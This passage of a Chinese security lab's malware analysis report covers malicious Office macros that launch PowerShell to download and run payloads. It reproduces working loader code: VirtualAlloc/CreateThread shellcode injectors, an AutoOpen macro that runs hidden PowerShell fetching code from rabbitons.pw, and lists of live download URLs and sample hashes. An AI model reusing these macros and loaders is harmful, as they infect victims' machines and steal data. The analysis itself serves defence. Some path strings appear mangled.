NT)");$n = g; [Byte[]] $p = $m.DownloadData("https://192.168.0.105:4444/$n
" )
$o = Add-Type -memberDefinition $q -Name "Win32" -namespace Win32Functions
-passthru
$x=$o::VirtualAlloc(0,$p.Length,0x3000,0x40);[System.Runtime.InteropServices.Marshal]::Copy($p,
0, [IntPtr]($x.ToInt32()), $p.Length)
$o::CreateThread(0,0,$x,0,0,0) | out-null; Start-Sleep -Second 86400}catch{}
脚本的功能是通过g函数随机生成四位的字符,从内网网址下载后加载执行[https://192.168.0.105:4444/xxxx](https://192.168.0.105:4444/xxxx)
(其中xxxx为随机四位字符)
这里连接的是192.168.0.105为内网IP,此样本很可能是渗透者进行内网渗透攻击的测试样本。此类样本还有很多:
leae0906f98568c5fb25b2bb32b1dbed7
l1a42671ce3b2701956ba49718c9e118e
l496ed16e636203fa0eadbcdc182b0e85
使用LNK文件,建立反弹shell的样本
**流量欺骗**
为了快速提升网站流量、Alexa排名、淘宝网店访问量、博客人气、每日访问IP、PV、UV等,有些网站站长会采取非常规的引流方法,采用软件在后台模拟人正常访问网页的点击动作而达到提升流量的目的。
样本MD5:5f8dc4db8a658b7ba185c2f038f3f075
文档打开后里面只有“test by c”这几个文字
提取出文档中的宏中的加密字符解密后得到可读的ps脚本如下
    $1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,[……] ,0x31,0x32,0x38,0x2e,0x31,0x39,0x36,0x2e,0x38,0x34,0x00,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $e";}
可见,ps脚本的主要功能就是执行Shellcode,这段Shellcode的功能就是调用wininet.dll中的函数进行连接138.128.196.84地址的443端口。而138.128.196.84地址正为流量宝类的软件用的地址。
**探测控制**
样本对通过宏调用Powershell下载PE文件在受影响的系统上检查是否为关心的目标并执行进一步地操作,具备针对性攻击的特点。
样本MD5:fba6b329876533f28d317e60fe53c8d3
从样本中抽取出的宏主要是根据系统版本下载相应的文件执行
    Sub AutoOpen()
        x1 = "Download"
        h = "Str"
        o = "power" & "shell" & ".exe"
        Const HIDDEN_WINDOW = 0
        strComputer = "."
        abcdef = h & "ing"
        Set objWMIService = GetObject("winmgmts:\" & strComputer & "rootcimv2")
        Set objStartup = objWMIService.Get("Win32_ProcessStartup")
        Set objConfig = objStartup.SpawnInstance_
        objConfig.ShowWindow = HIDDEN_WINDOW
        Set objProcess = GetObject("winmgmts:\" & strComputer & "rootcimv2:Win32_Process")
        objProcess.Create o & " -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c if ([IntPtr]::size -eq 4) {(new-object Net.WebClient)." & x1 & abcdef & "('http://rabbitons.pw/cache') | iex } else {(new-object Net.WebClient)." & x1 & abcdef & "('http://rabbitons.pw/css') | iex}", Null, objConfig, intProcessID
其中的对应32位系统的cache文件的内容如下:
我们对Shellcode进行简单分析:
1\. 在内存中解密,生成一个PE文件,在内存中展开跳到入口点处执行,将PE文件的.BSS区段进行解码,解码算法如下:
解密后的结果为:
2.判断是不是64位系统
判断虚拟机
3\. 用FindFirstUrlCacheEntry和FindNextUrlCacheEntry遍历IE临时文件目录 ,用于判断用户是否是攻击者的目标用户
4.计算用户和电脑信息的HASH
随后B03938处创建线程进行下面的动作
判断ipconfig -all 命令中是否有.edu、school、hospital、colledge、health、nurse等字符串
调用cmd /C ""ipconfig -all >
C:DOCUME~1yyyyyLOCALS~1Tempxxxx.TMP(xxx代表随机数)生成文件,检测.edu、school、hospital、colledge、health、nurse等字符串
5\. 遍历系统中的进程,检测有否指定hash的进程正在运行,
从IE缓存中查找用户是不是访问过这些网址:
通过WININET.FindFirstUrlCacheEntryW WININET.FindNextUrlCacheEntryW
WININET.FindCloseUrlCache
得到net view命令返回值中是否有pos、store、shop、sale等字符串
发送用户信息,并下载相对应的恶意程序:
其中,用这种手法的恶意样本还有如下:
样本HASH
|
系统版本
|
下载地址  
---|---|---  
f0483b9cfb8deb7ff97962b30fc779ad
|
32位
|
https://github.com/flowsdem/found/raw/master/rost  
64位
|
https://github.com/flowsdem/found/raw/master/virst  
fba6b329876533f28d317e60fe53c8d3
|
32位
|
http://rabbitons.pw/cache  
64位
|
http://rabbitons.pw/css  
62967bf585eef49f065bac233b506b36
|
32位
|
https://github.com/minifl147/flue/raw/master/memo  
64位
|
https://github.com/minifl147/flue/raw/master/adv  
**信息搜集**
样本中的宏代码下载执行信息收集类的Powershell脚本,很可能是某些针对性攻击的前导。
样本MD5:f7c3c7df2e7761eceff991bf457ed5b9
提取出来的宏代码为:
下载一个名为Get-Info-2.ps1的脚本,脚本功能是将本机的IP地址、domainname、username、usbid等发送到远端服务器中。
**总结**
天眼实验室再次提醒用户,此类恶意软件主要依赖通过微软的Office文档传播,用户应该确保宏不默认启用,提防任何来自不受信任来源的文件,当打开文件系统提示要使用宏时务必慎重。同时要尽量选用可靠的安全软件进行防范,如无必要不要关闭安全软件,当发现系统出现异常情况,应及时查杀木马,尽可能避免各类恶意代码的骚扰。
**参考资料**
l
l
l